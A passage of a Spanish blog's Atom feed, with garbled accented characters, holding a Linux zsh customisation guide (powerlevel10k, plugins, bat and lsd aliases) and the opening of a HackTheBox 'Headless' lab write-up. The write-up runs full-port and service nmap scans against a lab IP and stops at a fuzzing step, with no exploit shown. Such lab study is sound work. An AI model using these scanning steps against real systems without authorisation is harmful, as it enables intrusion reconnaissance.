              <li>Instalaci√≥n manual funciona en cualquier distribuci√≥n
                <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">sudo mv </span>Hack.zip /usr/share/fonts
  <span class="nb">cd</span> /usr/share/fonts
  <span class="nb">sudo </span>unzip Hack.zip
  <span class="nb">sudo rm </span>Hack.zip
</code></pre></div>                </div>
              </li>
              <li>Instalaci√≥n autom√°tica en ArchLinux
                <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yay <span class="nt">-S</span> ttf-hack-nerd
</code></pre></div>                </div>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Instalaci√≥n
    <ul>
      <li>Manual:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone <span class="nt">--depth</span><span class="o">=</span>1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
  <span class="nb">echo</span> <span class="s1">'source ~/powerlevel10k/powerlevel10k.zsh-theme'</span> <span class="o">&gt;&gt;</span>~/.zshrc
</code></pre></div>        </div>
      </li>
      <li>Usando Oh My Zsh
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone <span class="nt">--depth</span><span class="o">=</span>1 https://github.com/romkatv/powerlevel10k.git <span class="k">${</span><span class="nv">ZSH_CUSTOM</span><span class="k">:-</span><span class="nv">$HOME</span><span class="p">/.oh-my-zsh/custom</span><span class="k">}</span>/themes/powerlevel10k
</code></pre></div>        </div>
        <p>En el archivo <code class="language-plaintext highlighter-rouge">~/.zshrc</code> se debe agregar el tema en el caso de a ver usado Oh My Zsh <code class="language-plaintext highlighter-rouge">ZSH_THEME="powerlevel10k/powerlevel10k"</code></p>
      </li>
      <li>Para restaurar ZSH se debe usar el siguiente comando:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">exec </span>zsh
</code></pre></div>        </div>
      </li>
      <li>Para modificar el tema se usa:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  p10k configure
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h1 id="instalaci√≥n-de-plugins">Instalaci√≥n de plugins</h1>
<p>Hay dos plugin muy usados cu√°les son:</p>
<ul>
  <li>zsh-autosuggestions
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/zsh-users/zsh-autosuggestions <span class="k">${</span><span class="nv">ZSH_CUSTOM</span><span class="k">:-</span><span class="p">~/.oh-my-zsh/custom</span><span class="k">}</span>/plugins/zsh-autosuggestions
</code></pre></div>    </div>
  </li>
  <li>zsh-syntax-highlighting
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="k">${</span><span class="nv">ZSH_CUSTOM</span><span class="k">:-</span><span class="p">~/.oh-my-zsh/custom</span><span class="k">}</span>/plugins/zsh-syntax-highlighting 
</code></pre></div>    </div>
  </li>
</ul>

<p>En el archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> se modificar√° lo siguiente:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">plugins</span><span class="o">=(</span>git
    zsh-autosuggestions
    zsh-syntax-highlighting 
<span class="o">)</span>
</code></pre></div></div>
<p>Finalmente tendremos la siguiente terminal y nos quedar√≠a de la siguiente manera:</p>
<p align="center">
<img src="/assets/images/PersonalizacionLinux/ventana.png" />
</p>

<h1 id="configuraci√≥n-de-alias">Configuraci√≥n de alias</h1>

<h3 id="alias-de-bat">Alias de bat</h3>
<p>En este caso se utiliza la herramienta <a href="https://github.com/sharkdp/bat">bat</a> la cual tiene una funci√≥n parecida al comando cat, sin embargo, este tiene una presentaci√≥n m√°s elegante y m√°s visual, por lo cual se opta por modificar el comando cat usando el alias en <code class="language-plaintext highlighter-rouge">.zshrc</code></p>

<h2 id="instalaci√≥n-de-la-herramienta">Instalaci√≥n de la herramienta</h2>

<p>Para la instalaci√≥n de esta herramienta, se puede usar uno de los siguientes m√©todos:</p>

<h3 id="en-ubuntudebian">En Ubuntu/Debian:</h3>
<ol>
  <li>Instalaci√≥n mediante el gestor de paquetes:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">sudo </span>apt <span class="nb">install </span>bat
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n manual descargando la <a href="https://github.com/sharkdp/bat/releases/tag/v0.24.0">√∫ltima versi√≥n</a>:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">sudo </span>apt <span class="nb">install</span> ./nombre_del_archivo.deb
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="en-arch-linux">En Arch Linux:</h3>
<ol>
  <li>Instalaci√≥n mediante el gestor de paquetes <code class="language-plaintext highlighter-rouge">pacman</code>:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">sudo </span>pacman <span class="nt">-S</span> bat
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n manual desde el AUR utilizando un ayudante como <code class="language-plaintext highlighter-rouge">yay</code>:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> yay <span class="nt">-S</span> bat
</code></pre></div>    </div>
  </li>
</ol>

<p>Dentro del archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> se agrega el siguiente alias:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias cat</span><span class="o">=</span><span class="s1">'/bin/bat'</span>
<span class="nb">alias </span><span class="nv">catn</span><span class="o">=</span><span class="s1">'/bin/cat'</span>
<span class="nb">alias  </span><span class="nv">catln</span><span class="o">=</span><span class="s1">'/bin/bat --paging=never'</span>
</code></pre></div></div>
<p>As√≠ es como se ve nuestra terminal usando esta herramienta:</p>
<p align="center">
<img src="/assets/images/PersonalizacionLinux/batcat.png" />
</p>
<p>En algunos casos se necesita copiar cosas de la terminal, as√≠ que para eso se configur√≥ otro alias como catn</p>
<p align="center">
<img src="/assets/images/PersonalizacionLinux/batcat2.png" />
</p>

<h3 id="alias-de-lsd">Alias de lsd</h3>

<p><code class="language-plaintext highlighter-rouge">lsd</code> es una versi√≥n mejorada del comando <code class="language-plaintext highlighter-rouge">ls</code>, que incluye colores y otros elementos visuales para mejorar la experiencia de usuario. A continuaci√≥n, se presentan alias que puedes agregar a tu archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> para sustituir el uso de <code class="language-plaintext highlighter-rouge">ls</code> por <code class="language-plaintext highlighter-rouge">lsd</code>:</p>

<h2 id="instalaci√≥n-de-la-herramienta-1">Instalaci√≥n de la herramienta</h2>

<h3 id="en-ubuntudebian-1">En Ubuntu/Debian:</h3>
<ol>
  <li>Instalaci√≥n mediante el gestor de paquetes:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">sudo </span>apt <span class="nb">install </span>lsd
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n manual descargando la <a href="https://github.com/Peltoche/lsd/releases">√∫ltima versi√≥n</a>:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">sudo </span>dpkg <span class="nt">-i</span> ./nombre_del_archivo.deb
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="en-arch-linux-1">En Arch Linux:</h3>
<ol>
  <li>Instalaci√≥n mediante el gestor de paquetes <code class="language-plaintext highlighter-rouge">pacman</code>:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">sudo </span>pacman <span class="nt">-S</span> lsd
</code></pre></div>    </div>
  </li>
  <li>Instalaci√≥n manual desde el AUR utilizando un ayudante como <code class="language-plaintext highlighter-rouge">yay</code>:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> yay <span class="nt">-S</span> lsd
</code></pre></div>    </div>
  </li>
</ol>

<p>Dentro del archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> se agregan los siguientes alias:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias ls</span><span class="o">=</span><span class="s1">'lsd'</span>
<span class="nb">alias </span><span class="nv">l</span><span class="o">=</span><span class="s1">'ls -l'</span>
<span class="nb">alias </span><span class="nv">la</span><span class="o">=</span><span class="s1">'ls -a'</span>
<span class="nb">alias </span><span class="nv">lla</span><span class="o">=</span><span class="s1">'ls -la'</span>
<span class="nb">alias </span><span class="nv">lt</span><span class="o">=</span><span class="s1">'ls --tree'</span>

</code></pre></div></div>
<p>As√≠ es como se ve nuestra terminal usando esta herramienta:</p>

<p align="center">
<img src="/assets/images/PersonalizacionLinux/carpetas.png" />
</p>

<p align="center">
<img src="/assets/images/PersonalizacionLinux/l.png" />
</p>

<h1 id="configuraci√≥n-de-zshrc">Configuraci√≥n de .zshrc</h1>
<p>Esta es la configuraci√≥n final <code class="language-plaintext highlighter-rouge">.zshrc</code></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">if</span> <span class="o">[[</span> <span class="nt">-r</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CACHE_HOME</span><span class="k">:-</span><span class="nv">$HOME</span><span class="p">/.cache</span><span class="k">}</span><span class="s2">/p10k-instant-prompt-</span><span class="k">${</span><span class="p">(%)</span><span class="k">:-</span><span class="p">%n</span><span class="k">}</span><span class="s2">.zsh"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">source</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CACHE_HOME</span><span class="k">:-</span><span class="nv">$HOME</span><span class="p">/.cache</span><span class="k">}</span><span class="s2">/p10k-instant-prompt-</span><span class="k">${</span><span class="p">(%)</span><span class="k">:-</span><span class="p">%n</span><span class="k">}</span><span class="s2">.zsh"</span>
<span class="k">fi</span>

<span class="c"># Path to your Oh My Zsh installation.</span>
<span class="nb">export </span><span class="nv">ZSH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.oh-my-zsh"</span>

<span class="nv">ZSH_THEME</span><span class="o">=</span><span class="s2">"powerlevel10k/powerlevel10k"</span>
<span class="nv">plugins</span><span class="o">=(</span>git
    zsh-autosuggestions
    zsh-syntax-highlighting 
<span class="o">)</span>

<span class="nb">source</span> <span class="nv">$ZSH</span>/oh-my-zsh.sh

<span class="c"># User configuration</span>
<span class="nv">ZSH_HIGHLIGHT_HIGHLIGHTERS</span><span class="o">=(</span>main brackets pattern cursor<span class="o">)</span>
ZSH_HIGHLIGHT_STYLES[command]<span class="o">=</span><span class="s1">'fg=blue,bold'</span>
ZSH_HIGHLIGHT_STYLES[builtin]<span class="o">=</span><span class="s1">'fg=green,bold'</span>

<span class="c"># Example aliases</span>
<span class="c"># alias zshconfig="mate ~/.zshrc"</span>
<span class="c"># alias ohmyzsh="mate ~/.oh-my-zsh"</span>

<span class="nb">alias ls</span><span class="o">=</span><span class="s1">'lsd'</span>
<span class="nb">alias </span><span class="nv">l</span><span class="o">=</span><span class="s1">'ls -l'</span>
<span class="nb">alias </span><span class="nv">la</span><span class="o">=</span><span class="s1">'ls -a'</span>
<span class="nb">alias </span><span class="nv">lla</span><span class="o">=</span><span class="s1">'ls -la'</span>
<span class="nb">alias </span><span class="nv">lt</span><span class="o">=</span><span class="s1">'ls --tree'</span>

<span class="nb">alias cat</span><span class="o">=</span><span class="s1">'/bin/bat'</span>
<span class="nb">alias </span><span class="nv">catn</span><span class="o">=</span><span class="s1">'/bin/cat'</span>
<span class="nb">alias  </span><span class="nv">catln</span><span class="o">=</span><span class="s1">'/bin/bat --paging=never'</span>

<span class="c"># To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.</span>
<span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> ~/.p10k.zsh <span class="o">]]</span> <span class="o">||</span> <span class="nb">source</span> ~/.p10k.zsh
</code></pre></div></div>
<h1 id="aplicaci√≥n-para-el-usuario-root">Aplicaci√≥n para el usuario root</h1>
<p>Si deseas que estos alias tambi√©n est√©n disponibles para el usuario root, puedes seguir los mismos pasos anteriores. Alternativamente, puedes crear un enlace simb√≥lico del archivo .zshrc de tu usuario hacia el directorio del root:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo ln</span> <span class="nt">-s</span> ~/.zshrc /root/.zshrc
</code></pre></div></div>
<p>Si encuentras un error al crear el enlace, es posible que ya exista un archivo .zshrc en el directorio del root. En ese caso, puedes eliminar el archivo .zshrc del root y luego intentar nuevamente:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo rm</span> /root/.zshrc 
</code></pre></div></div>
<p>Para mejorar la visibilidad y distinguir f√°cilmente en qu√© usuario est√°s, puedes personalizar el color del prompt. Esto se puede lograr editando el archivo <code class="language-plaintext highlighter-rouge">.p10k.zsh</code> de la siguiente manera:</p>

<p align="center">
<img src="/assets/images/PersonalizacionLinux/root.png" />
</p>

<p>En el archivo <code class="language-plaintext highlighter-rouge">.p10k.zsh</code>, busca la l√≠nea 220, donde por defecto ver√°s el valor <code class="language-plaintext highlighter-rouge">31</code>. Reemplaza este valor con la palabra <code class="language-plaintext highlighter-rouge">red</code>. De manera similar, en la l√≠nea 230, sustituye el valor <code class="language-plaintext highlighter-rouge">39</code> tambi√©n por <code class="language-plaintext highlighter-rouge">red</code>.</p>

<p>Cerrando la terminal o saliendo del usuario root tendr√≠amos de la siguiente manera:</p>

<p align="center">
<img src="/assets/images/PersonalizacionLinux/root2.png" />
</p>]]></content><author><name>Eduardo Rivera</name></author><category term="Linux" /><category term="Linux" /><category term="Personalizaci√≥n" /><summary type="html"><![CDATA[En este post es mi personalizaci√≥n personal de un sistema operativo Linux de las herramientas m√°s usadas y las m√°s c√≥modas.]]></summary></entry><entry><title type="html">M√°quina Headless de HackTheBox con dificultad f√°cil</title><link href="http://localhost:4000/hackthebox/Maquina-Headless/" rel="alternate" type="text/html" title="M√°quina Headless de HackTheBox con dificultad f√°cil" /><published>2024-06-30T00:00:00-06:00</published><updated>2024-06-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/Maquina-Headless</id><content type="html" xml:base="http://localhost:4000/hackthebox/Maquina-Headless/"><![CDATA[<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.001.png" />
</p>

<p>En esta m√°quina primero que nada se tuvo que hacer un an√°lisis para poder obtener informaci√≥n sobre los puertos que estaba abierto para ello se llev√≥ a cabo el uso NMAP, en el cual se hace con el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-vvv</span> ‚Äìmin-rate 5000 <span class="nt">-n</span> 10.10.11.8 
</code></pre></div></div>

<ul>
  <li>
    <p><strong>-p-</strong>: Este par√°metro indica que Nmap debe escanear todos los puertos, del 1 al 65535. Normalmente, Nmap escanea solo los 1000 puertos m√°s comunes si no se especifica ning√∫n rango de puertos.</p>
  </li>
  <li>
    <p><strong>-sC</strong>: Este par√°metro habilita el uso de los scripts Nmap Scripting Engine (NSE) con la opci√≥n de script predeterminado. Los scripts NSE pueden realizar una variedad de tareas, como la detecci√≥n de versiones de servicios y la identificaci√≥n de vulnerabilidades.</p>
  </li>
  <li>
    <p><strong>-vvv</strong>: Este par√°metro aumenta la verbosidad del escaneo, proporcionando informaci√≥n detallada sobre el progreso del escaneo y los resultados. Cuantos m√°s ‚Äúv‚Äù se a√±adan, m√°s detallada ser√° la salida.</p>
  </li>
  <li>
    <p><strong>‚Äì-min-rate 5000</strong>: Este par√°metro establece la tasa m√≠nima de paquetes por segundo que Nmap deber√≠a enviar, en este caso, 5000 paquetes por segundo. Esto hace que el escaneo sea m√°s r√°pido, pero puede generar tr√°fico de red considerable y posiblemente ser detectado como un comportamiento sospechoso por sistemas de detecci√≥n de intrusos (IDS).</p>
  </li>
  <li>
    <p><strong>-n</strong>: Este par√°metro deshabilita la resoluci√≥n de nombres de dominio inversa. Esto significa que Nmap no intentar√° resolver direcciones IP a nombres de host, lo que puede acelerar el escaneo.</p>
  </li>
</ul>

<p><strong>Resultados obtenidos:</strong></p>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.002.png" />
</p>

<p>En la captura podemos ver que solo tenemos abiertos dos puertos el cual uno es el puerto 22 y el otro el 5000, cual sabemos las siguientes caracter√≠sticas:</p>

<p><strong>Puerto 22</strong></p>

<ul>
  <li><strong>Protocolo:</strong> TCP</li>
  <li><strong>Servicio com√∫n:</strong> SSH (Secure Shell)</li>
  <li><a name="_int_ahikk2d5"></a><strong>Uso principal:</strong> El puerto 22 es conocido por el protocolo SSH, que proporciona una forma segura de conectarse a otro ordenador a trav√©s de una red no segura. SSH permite el acceso remoto a servidores, la transferencia segura de archivos mediante SCP (Secure Copy) y SFTP (SSH File Transfer Protocol), as√≠ como la ejecuci√≥n remota de comandos. SSH es esencial en la administraci√≥n de sistemas y servidores, especialmente en entornos Linux y Unix.</li>
</ul>

<p><strong>Puerto 5000</strong></p>

<ul>
  <li><strong>Protocolo:</strong> TCP/UDP</li>
  <li><strong>Servicios comunes:</strong>
    <ul>
      <li><strong>UPnP (Universal Plug and Play):</strong> Este protocolo, utilizado principalmente en redes dom√©sticas, permite que dispositivos en una red se descubran y se comuniquen autom√°ticamente entre s√≠. UPnP facilita la configuraci√≥n de redes y la conectividad entre dispositivos sin intervenci√≥n manual significativa.</li>
      <li><strong>Docker:</strong> En el contexto de Docker, un sistema de contenedores de aplicaciones, el puerto 5000 se usa com√∫nmente como el puerto predeterminado para el registro privado de Docker (Docker Registry). Un Docker Registry es un repositorio para almacenar y distribuir im√°genes Docker.</li>
      <li><strong>Flask:</strong> En el desarrollo web con Python, el marco Flask puede usar el puerto 5000 como su puerto predeterminado para ejecutar aplicaciones web durante el desarrollo.</li>
    </ul>
  </li>
  <li><strong>Uso principal:</strong> Dado que el puerto 5000 no est√° asignado de manera oficial a un servicio espec√≠fico por la IANA (Internet Assigned Numbers Authority), puede ser utilizado por diferentes aplicaciones y servicios seg√∫n las necesidades de los usuarios y desarrolladores. Sin embargo, los usos mencionados arriba son algunos de los m√°s comunes.</li>
</ul>

<p>A continuaci√≥n, procedemos a obtener m√°s informaci√≥n de los puertos usando nmap esto se hace principalmente para que no se demore demasiado tiempo en obtener la informaci√≥n:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p22</span>,5000 <span class="nt">-A</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> 10.10.11.8
</code></pre></div></div>

<ul>
  <li><strong>-p22,5000</strong>: Esta opci√≥n especifica los puertos que deseas escanear. En este caso, Nmap escanear√° los puertos 22 (usualmente usado por SSH) y 5000. Puedes especificar un rango de puertos o una lista separada por comas.</li>
  <li><strong>-A</strong>: Esta opci√≥n activa la detecci√≥n avanzada. Incluir√°:
    <ol>
      <li>Detecci√≥n de sistema operativo.</li>
      <li>Detecci√≥n de versi√≥n de servicio.</li>
      <li>Escaneo de scripts.</li>
      <li>Rastreo de ruta (traceroute).</li>
    </ol>
  </li>
  <li><strong>-Pn</strong>: Esta opci√≥n le dice a Nmap que no haga un ‚Äúping‚Äù previo a los hosts para ver si est√°n activos. Por defecto, Nmap hace un ping para determinar si un host est√° activo antes de escanearlo. Con -Pn, Nmap escanear√° los puertos incluso si el host no responde a los pings.</li>
</ul>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.005.png" />
</p>

<p>En esta captura podemos ver algo interesante, primero que nada, podemos ver que en el puerto 22 si bien nos muestra la versi√≥n en el cual est√° trabajando el problema radica que no hay vulnerabilidad aparente, es decir si va al internet no hay ning√∫n tipo de exploit que se puede usar para conectarse, as√≠ que el √∫nico puerto que queda disponible es el 5000 sin embargo este solo se usa para alojar el acceso a la p√°gina web as√≠ que no hay manera de explotar una vulnerabilidad.</p>

<p>Solo queda ingresar a la p√°gina:</p>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.004.png" />
</p>

<p>En este caso procedemos a buscar p√°ginas que puedan estar ocultas apartir de la URL, para eso usamos FUZZ</p>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.003.png" />
</p>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="puerto 5000" /><category term="nmap" /><summary type="html"><![CDATA[Abordando el desaf√≠o de la m√°quina Headless en HackTheBox: una intrigante aventura que, aunque aparentemente sencilla, esconde m√∫ltiples desaf√≠os y lecciones clave.]]></summary></entry></feed>